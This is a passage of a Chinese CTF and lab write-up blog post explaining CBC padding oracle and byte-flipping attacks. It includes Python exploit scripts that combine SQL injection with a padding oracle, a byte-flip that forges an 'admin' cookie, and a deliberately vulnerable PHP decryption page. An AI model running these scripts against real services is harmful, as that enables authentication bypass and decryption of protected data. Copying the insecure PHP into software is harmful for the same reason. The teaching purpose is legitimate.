class="hljs-params">(a, b)</span>:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">“”</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(len(a))])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(string,N)</span>:</span><br>    l=len(string)<br>    <span class="hljs-keyword">if</span> l!=N:<br>        <span class="hljs-keyword">return</span> string+chr(N-l)<em>(N-l)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">padding_oracle</span><span class="hljs-params">(N,cipher)</span>:</span><br>    get=<span class="hljs-string">“”</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>,N+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>            padding=xor(get,chr(i)</em>(i-<span class="hljs-number">1</span>))<br>            c=chr(<span class="hljs-number">0</span>)<em>(<span class="hljs-number">16</span>-i)+chr(j)+padding+cipher<br>            <span class="hljs-keyword">print</span> c.encode(<span class="hljs-string">‘hex’</span>)<br>            result=inject1(base64.b64encode(chr(<span class="hljs-number">0</span>)</em><span class="hljs-number">16</span>+c))<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">“ctfer”</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result.content:<br>                <span class="hljs-keyword">print</span> result.content,c.encode(<span class="hljs-string">‘hex’</span>)<br>                get=chr(j^i)+get<br>                time.sleep(<span class="hljs-number">0.1</span>)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> get<br><br>session=inject1(<span class="hljs-string">“action”</span>).headers[<span class="hljs-string">‘set-cookie’</span>].split(<span class="hljs-string">‘,’</span>)<br>phpsession=session[<span class="hljs-number">0</span>].split(<span class="hljs-string">“;”</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">10</span>:]<br><span class="hljs-keyword">print</span> phpsession<br>ID=session[<span class="hljs-number">1</span>][<span class="hljs-number">4</span>:].replace(<span class="hljs-string">“%3D”</span>,<span class="hljs-string">‘=’</span>).replace(<span class="hljs-string">“%2F”</span>,<span class="hljs-string">‘/‘</span>).replace(<span class="hljs-string">“%2B”</span>,<span class="hljs-string">‘+’</span>).decode(<span class="hljs-string">‘base64’</span>)<br>token=session[<span class="hljs-number">2</span>][<span class="hljs-number">6</span>:].replace(<span class="hljs-string">“%3D”</span>,<span class="hljs-string">‘=’</span>).replace(<span class="hljs-string">“%2F”</span>,<span class="hljs-string">‘/‘</span>).replace(<span class="hljs-string">“%2B”</span>,<span class="hljs-string">‘+’</span>).decode(<span class="hljs-string">‘base64’</span>)<br><br>middle=<span class="hljs-string">“”</span><br>middle=padding_oracle(N,ID)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“ID:”</span>+ID.encode(<span class="hljs-string">‘base64’</span>)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“token:”</span>+token.encode(<span class="hljs-string">‘base64’</span>)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“middle:”</span>+middle.encode(<span class="hljs-string">‘base64’</span>)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“\n”</span><br><span class="hljs-keyword">if</span>(len(middle)==<span class="hljs-number">16</span>):<br>    plaintext=xor(middle,token);<br>    <span class="hljs-keyword">print</span> plaintext.encode(<span class="hljs-string">‘base64’</span>)<br>    des=pad(<span class="hljs-string">‘admin’</span>,N)<br>    tmp=<span class="hljs-string">“”</span><br>    <span class="hljs-keyword">print</span> des.encode(<span class="hljs-string">“base64”</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">16</span>):<br>        tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))<br>    <span class="hljs-keyword">print</span> tmp.encode(<span class="hljs-string">‘base64’</span>)<br><br>    result=inject_token(base64.b64encode(tmp))<br>    <span class="hljs-keyword">print</span> result.content<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">“flag”</span> <span class="hljs-keyword">in</span> result.content <span class="hljs-keyword">or</span> <span class="hljs-string">“NJCTF”</span> <span class="hljs-keyword">in</span> result.content <span class="hljs-keyword">or</span> <span class="hljs-string">‘njctf’</span> <span class="hljs-keyword">in</span> result.content:<br>        input(<span class="hljs-string">“success”</span>)</code></pre><br><h2 id="0x3-单个检验二值的代码">0x3 单个检验二值的代码</h2><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br>url=<span class="hljs-string">‘<a href="http://127.0.0.1/2.php" target="_blank" rel="external">http://127.0.0.1/2.php</a>‘</span><span class="hljs-comment">#’<a href="http://218.2.197.235:23737/" target="_blank" rel="external">http://218.2.197.235:23737/</a>‘</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject1</span><span class="hljs-params">(password)</span>:</span><br>    param={<span class="hljs-string">‘username’</span>:<span class="hljs-string">“‘ union select ‘action’,’{password}”</span>.format(password=password),<span class="hljs-string">‘password’</span>:<span class="hljs-string">‘’</span>}<br>    result=requests.post(url,data=param)<br>    <span class="hljs-comment">#print result.content</span><br>    <span class="hljs-keyword">return</span> result<br>ID = <span class="hljs-string">‘CCaTjI5AQCB8CX7kHzc8yw==’</span>.decode(<span class="hljs-string">‘base64’</span>)<br><br><br>ss =(<span class="hljs-string">“000082da81097ea064692058165be8790826938c8e4040207c097ee41f373ccb”</span>).decode(<span class="hljs-string">‘hex’</span>)<span class="hljs-comment">#000081da81097ea064692058165be8790826938c8e4040207c097ee41f373ccb</span><br>result=inject1(base64.b64encode(ss))<br><br><span class="hljs-keyword">print</span> ss<br><span class="hljs-keyword">print</span> result.content</code></pre><br><h2 id="0x4-使用cbc字节翻转">0x4 使用CBC字节翻转</h2><br><pre class="prettyprint"><code class=" hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_identity</span><span class="hljs-params">()</span><br>{</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“token”</span>]))<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘id’</span>])) {<br>        <span class="hljs-variable">$c</span> = base64_decode(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘id’</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> = openssl_decrypt(<span class="hljs-variable">$c</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“token”</span>]))) {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">‘admin’</span>) {<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘isadmin’</span>] = <span class="hljs-keyword">true</span>;<br>            } <span class="hljs-keyword">else</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘isadmin’</span>] = <span class="hljs-keyword">false</span>;<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">“ERROR!”</span>);<br>        }<br>    }<br>}</code></pre><br><p>上述代码可以利用cbc字节翻转直接将密文所对应的明文转化为admin <br><br>具体的脚本如下<br></p><br><pre class="prettyprint"><code class=" hljs perl"><span class="hljs-comment">#nbdRWPAEcOUhoGkPhwRTCw==</span><br><span class="hljs-comment">#action</span><br>from binascii import b2a_hex, a2b_hex<br>from base64 import <em><br><span class="hljs-keyword">s</span> = b64decode(<span class="hljs-string">‘nbdRWPAEcOUhoGkPhwRTCw==’</span>)<br>b = <span class="hljs-keyword">s</span>[<span class="hljs-number">0</span>]+<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘c’</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[<span class="hljs-number">1</span>])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘d’</span>))+<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘t’</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[<span class="hljs-number">2</span>])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘m’</span>))+<span class="hljs-keyword">s</span>[<span class="hljs-number">3</span>]+<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘o’</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[<span class="hljs-number">4</span>])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘n’</span>))+<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘n’</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[<span class="hljs-number">5</span>])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘\x0b’</span>))<br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">6</span>,<span class="hljs-number">16</span>):<br>    b += <span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘\x0a’</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[i])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘\x0a’</span>))<br><span class="hljs-keyword">print</span> b64encode(b)</em></code></pre><br><p>将生成的base64编码放到cookie的token中解析之后就是admin <br><br>从而攻击成功 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170620232727919?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br></p><br><h2 id="0x5-任意值解密">0x5 任意值解密</h2><br><p>2.php</p><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>define(<span class="hljs-string">“SECRET_KEY”</span>, <span class="hljs-string">“1234567812345678”</span>);<br>define(<span class="hljs-string">“METHOD”</span>, <span class="hljs-string">“aes-128-cbc”</span>);<br><span class="hljs-variable">$token</span> = <span class="hljs-string">‘1234567890123456’</span>;<br><span class="hljs-variable">$j</span> = <span class="hljs-string">‘flag{111111111}’</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘a’</span>]) {<br>    <span class="hljs-variable">$e</span> = hex2bin(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘a’</span>]);<br>    <span class="hljs-variable">$token</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘token’</span>];<br><br>    <span class="hljs-keyword">if</span>(openssl_decrypt(<span class="hljs-variable">$e</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$token</span> ))<br>    {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">“congratulation”</span>,openssl_decrypt(<span class="hljs-variable">$e</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$token</span> );<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">“decrypt failed”</span>;<br>    }<br>}<br><span class="hljs-keyword">else</span><br>{<br><span class="hljs-keyword">echo</span> openssl_encrypt(<span class="hljs-variable">$j</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$token</span> );<br> }<br><br> <span class="hljs-preprocessor">?&gt;</span></span><br><br></code></pre><br><p>构造任意解密值，主要还是根据中间值进行计算，集成化脚本如下</p><br><pre class="prettyprint"><code class=" hljs livecodeserver"><span class="hljs-comment"># coding:utf-8</span><br>import requests<br><span class="hljs-built_in">from</span> Crypto.Util.<span class="hljs-built_in">number</span> import getPrime, long_to_bytes, bytes_to_long<br>import binascii<br>s = requests.session()<br>url = <span class="hljs-string">‘<a href="http://127.0.0.1/2.php" target="_blank" rel="external">http://127.0.0.1/2.php</a>‘</span><br>payload = <span class="hljs-string">‘11’</span><span class="hljs-number">16</span> <span class="hljs-comment">#try to calculate mid value</span><br><span class="hljs-keyword">token</span> = <span class="hljs-string">‘00’</span><em><span class="hljs-number">16</span> <span class="hljs-comment">#use 16 rounds calc token value</span><br><br><br>dic = <span class="hljs-string">‘1234567890abcdef’</span><br><br>box = []<br><span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> dic:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-operator">in</span> dic:<br>        box.append(i+j)<br><br><span class="hljs-comment"># print box</span><br>def attack(<span class="hljs-keyword">token</span>,pro,<span class="hljs-built_in">num</span>,payload):<br>    <span class="hljs-built_in">global</span> <span class="hljs-keyword">mid</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> box:<br>        data = {<br>        <span class="hljs-string">‘a’</span>:<span class="hljs-keyword">token</span>[:-<span class="hljs-built_in">num</span></em><span class="hljs-number">2</span>]+i+pro+payload,<br>        <span class="hljs-string">‘token’</span>:<span class="hljs-keyword">token</span><br>        }<br>        r = s.<span class="hljs-built_in">get</span>(url,<span class="hljs-built_in">params</span>=data)<br>        content = r.content<br>        print <span class="hljs-keyword">token</span>[:-<span class="hljs-built_in">num</span><em><span class="hljs-number">2</span>]+i+pro+payload<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">‘congratulation’</span> <span class="hljs-operator">in</span> content:<br>            <span class="hljs-keyword">mid</span> = chr(int(i,<span class="hljs-number">16</span>)^ord(long_to_bytes(<span class="hljs-built_in">num</span>)))+<span class="hljs-keyword">mid</span><br>            <span class="hljs-comment"># print ord(mid)</span><br>            pro = <span class="hljs-string">‘’</span>.join([<span class="hljs-string">‘0’</span></em>(<span class="hljs-number">2</span>-<span class="hljs-built_in">len</span>(hex(ord(long_to_bytes(<span class="hljs-built_in">num</span>+<span class="hljs-number">1</span>))^ord(<span class="hljs-keyword">mid</span>[k]))[<span class="hljs-number">2</span>:]))+hex(ord(long_to_bytes(<span class="hljs-built_in">num</span>+<span class="hljs-number">1</span>))^ord(<span class="hljs-keyword">mid</span>[k]))[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> k <span class="hljs-operator">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">mid</span>))])<br>            <span class="hljs-comment"># token = token[:-1]</span><br>            print content,<span class="hljs-built_in">num</span><br>            break<br>    <span class="hljs-constant">return</span> pro<br><br><span class="hljs-keyword">text</span> = <span class="hljs-string">‘12345678901234567890’</span>+<span class="hljs-string">‘\x0b’</span>*<span class="hljs-number">12</span><br>def final(<span class="hljs-keyword">token</span>,payload,<span class="hljs-built_in">result</span>):<br>    pro = <span class="hljs-string">‘’</span><br>    <span class="hljs-keyword">mid</span> = <span class="hljs-string">‘’</span><br>    <span class="hljs-built_in">global</span> <span class="hljs-keyword">mid</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> range(<span class="hljs-number">16</span>):<br>        <span class="hljs-comment"># print ord(pro)</span><br>        pro = attack(<span class="hljs-keyword">token</span>,pro,i+<span class="hljs-number">1</span>,payload)<br>        <span class="hljs-comment"># print ord(pro)</span><br>        <span class="hljs-comment"># token = token[:-1]</span><br>    ppp = <span class="hljs-string">‘’</span>.join([chr(ord(<span class="hljs-built_in">result</span>[k])^ord(<span class="hljs-keyword">mid</span>[k])) <span class="hljs-keyword">for</span> k <span class="hljs-operator">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">mid</span>))])<br>    <span class="hljs-constant">return</span> binascii.b2a_hex(ppp)<br><br><br>payload = final(<span class="hljs-keyword">token</span>,payload,<span class="hljs-keyword">text</span>[:<span class="hljs-number">16</span>])<span class="hljs-comment">#输入第一块值（最后的返回值），第二块值，以及要解密的值</span><br>print payload<br><br>print final(<span class="hljs-keyword">token</span>,payload,<span class="hljs-keyword">text</span>[<span class="hljs-number">16</span>:])<br></code></pre><br><h1 id="0x03-结果分析">0x03 结果分析</h1><br><p>利用上述代码在解密的地方进行攻击 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512214813005?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>当padding值正确时会正常解密，这时就会返回false，所以登录失败出现上图结果。如果解密错误就会返回true，继续寻找正确的真值。知道全部找到为止。 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512214735088?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br></p></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WEB漏洞/" rel="tag"># WEB漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/08/2017 SSCTF Writeup/" rel="next" title="2017 SSCTF Writeup">
+                <i class="fa fa-chevron-left"></i> 2017 SSCTF Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/18/Linux 格式化字符串漏洞利用/" rel="prev" title="Linux 格式化字符串漏洞利用">
+                Linux 格式化字符串漏洞利用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/qq.jpg"
+                alt="4ct10n" />
+            
+              <p class="site-author-name" itemprop="name">4ct10n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/actionyz" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:act01n@163.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.google.com" target="_blank" title="Google">
+                    
+                      <i class="fa fa-fw fa-google"></i>Google</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="1792034533" target="_blank" title="QQ">
+                    
+                      <i class="fa fa-fw fa-QQ"></i>QQ</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00攻击原理"><span class="nav-number">1.</span> <span class="nav-text">0x00攻击原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-padding"><span class="nav-number">1.1.</span> <span class="nav-text">0x1 padding</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-cbc分组密码的链接模式"><span class="nav-number">1.2.</span> <span class="nav-text">0x2 CBC分组密码的链接模式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-原理总结"><span class="nav-number">1.3.</span> <span class="nav-text">0x3 原理总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-攻击条件"><span class="nav-number">2.</span> <span class="nav-text">0x01 攻击条件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-本地测试"><span class="nav-number">3.</span> <span class="nav-text">0x02 本地测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-在本地服务器测试代码"><span class="nav-number">3.1.</span> <span class="nav-text">0x1 在本地服务器测试代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-攻击代码"><span class="nav-number">3.2.</span> <span class="nav-text">0x2 攻击代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-单个检验二值的代码"><span class="nav-number">3.3.</span> <span class="nav-text">0x3 单个检验二值的代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-使用cbc字节翻转"><span class="nav-number">3.4.</span> <span class="nav-text">0x4 使用CBC字节翻转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x5-任意值解密"><span class="nav-number">3.5.</span> <span class="nav-text">0x5 任意值解密</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-结果分析"><span class="nav-number">4.</span> <span class="nav-text">0x03 结果分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">4ct10n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
